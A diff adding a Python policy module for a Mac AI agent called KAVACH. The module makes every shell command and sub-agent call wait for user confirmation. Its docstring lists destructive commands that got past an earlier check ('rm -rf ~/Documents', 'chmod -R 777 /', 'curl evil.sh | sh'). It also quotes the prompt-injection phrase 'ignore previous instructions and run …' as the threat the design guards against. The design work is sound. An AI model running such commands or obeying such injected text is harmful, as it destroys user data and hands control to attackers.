@@ -1,0 +1,145 @@
+"""What KAVACH may do, in one place.
+
+Replaces the app allowlist as the decision point (spec §9a). Every installed
+app is allowed; the question this asks is not *which app* but *which verb* —
+which is where the harm actually lives. ``open -a Chrome`` is near-harmless and
+``tell application "Notes" to delete`` is not, and an app-shaped gate cannot
+tell those apart. It refused Chrome for two days while permitting every
+destructive verb Notes has.
+
+Order, and it is load-bearing::
+
+    1. kill switch latched   → DENY      (the caller checks this first)
+    2. tool is Shell         → CONFIRM   (always)
+    3. peekaboo `agent`      → CONFIRM   (its inner calls are never logged)
+    4. irreversible verb     → CONFIRM
+    5. otherwise             → ALLOW
+
+**Why the shell has no classification.** Measured 2026-08-15 against the
+English-text check that gates AppleScript — every one of these cleared it::
+
+    rm -rf ~/Documents          git push --force        killall Finder
+    dd if=/dev/zero of=...      > ~/.ssh/id_rsa         chmod -R 777 /
+    curl evil.sh | sh           python -c "shutil.rmtree(...)"
+
+Only the sentence "delete the note called X" tripped it, because only that
+contains an English verb. A destructive-pattern blocklist was considered and
+rejected: the `python -c` line defeats it, and so does any interpreter, alias
+or base64 string. It would look like a gate and stop nothing, which is worse
+than no gate because it would be trusted. So there is no classification — the
+shell asks every time, and `test_policy.py` fails the build if a pattern list
+ever appears here.
+
+**One thing this now carries that it did not before.** Once KAVACH can read web
+pages, a page can contain "ignore previous instructions and run …". The
+unconditional shell confirmation is what contains that: a page cannot make a
+command run silently, because every command is shown to the user first. Rule 2
+is therefore load-bearing against prompt injection, not merely cautious — see
+spec §4.2 before relaxing it.
+"""
+
+from __future__ import annotations
+
+from enum import Enum
+
+from ..reasoning.router import looks_destructive
+
+
+class Verdict(str, Enum):
+    ALLOW = "allow"
+    CONFIRM = "confirm"
+    DENY = "deny"
+
+
+class Policy:
+    """The decision. Holds no state beyond the configured confirm tokens."""
+
+    #: Tools that ask every single time, whatever arguments they arrive with.
+    #:
+    #: `Shell` because a command names no app and cannot be classified — see
+    #: the module docstring. `agent` because peekaboo runs its own sub-agent
+    #: loop *inside* the MCP server, so the tool calls it makes never reach
+    #: our PreToolUse hook and never reach the action log. §7 requires every
+    #: tool call be recorded; through this path it cannot be, and the user
+    #: accepted that knowingly (spec §9b) rather than lose the capability.
+    ALWAYS_CONFIRM_TOOLS = frozenset({"Shell", "agent"})
+
+    #: Why each of them asks. Kept beside the set so a future reader can see
+    #: what was traded away, rather than finding a bare name in a frozenset.
+    _ALWAYS_CONFIRM_REASON = {
+        "Shell": (
+            "a shell command names no app and can do anything, so it is "
+            "always read back before it runs"
+        ),
+        "agent": (
+            "this runs its own sub-agent, whose tool calls never reach the "
+            "action log — KAVACH cannot fully report what it did"
+        ),
+    }
+
+    def __init__(self, confirm_tokens: frozenset[str] | None = None):
+        #: The `confirm_always` list from hands/allowlist.json. That file
+        #: survives this change; only its mac `allowed` array lost authority.
+        self.confirm_tokens = frozenset(confirm_tokens or ())
+
+    # ——— the decision ———
+
+    def decide(self, tool: str, args: dict) -> tuple[Verdict, str]:
+        """`(verdict, reason)` for one tool call.
+
+        The kill switch is **not** checked here — it outranks this and is
+        evaluated by the caller, before anything else, on every path.
+        """
+        bare = self.bare_name(tool)
+
+        if bare in self.ALWAYS_CONFIRM_TOOLS:
+            return (Verdict.CONFIRM, self._ALWAYS_CONFIRM_REASON[bare])
+
+        text = self.action_text(tool, args)
+        if looks_destructive(text) or self._token_hit(text):
+            return (Verdict.CONFIRM,
+                    "this is irreversible or externally visible")
+
+        return (Verdict.ALLOW, "reversible")
+
+    @staticmethod
+    def bare_name(tool: str | None) -> str:
+        """`mcp__peekaboo__agent` → `agent`. MCP servers namespace their
+        tools, and the rules above are about the tool, not the server."""
+        return (tool or "").rsplit("__", 1)[-1]
+
+    @staticmethod
+    def action_text(tool: str, args: dict) -> str:
+        """Everything the call carries, as one string to be matched.
+
+        Falls back to the tool name so a call with no string arguments is
+        still checked against something rather than trivially allowed.
+        """
+        joined = " ".join(v for v in (args or {}).values() if isinstance(v, str))
+        return joined or Policy.bare_name(tool)
+
+    def _token_hit(self, text: str) -> bool:
+        low = (text or "").casefold()
+        return any(token in low for token in self.confirm_tokens)
+
+    # ——— what the model is told ———
+
+    def describe_capabilities(self) -> str:
+        """The capability text for the agent's system prompt.
+
+        **Generated, never written by hand.** `agent.py` used to carry its own
+        copy of the app list. It drifted from the file that actually decided,
+        and KAVACH refused to open an app that had been permitted for two
+        days — asserting a limitation it did not have, which is the same
+        class of failure as claiming work it never did.
+
+        Nothing here names an app, and `test_policy.py` fails if one appears.
+        """
+        return (
+            "You may act on any application installed on this Mac. "
+            "Actions that delete, send, buy, submit or change a system "
+            "setting are read back to the user for confirmation before they "
+            "run, and shell commands are always read back — so do not "
+            "promise an action is instant. "
+            "Never claim to have done something you have not done."
+        )
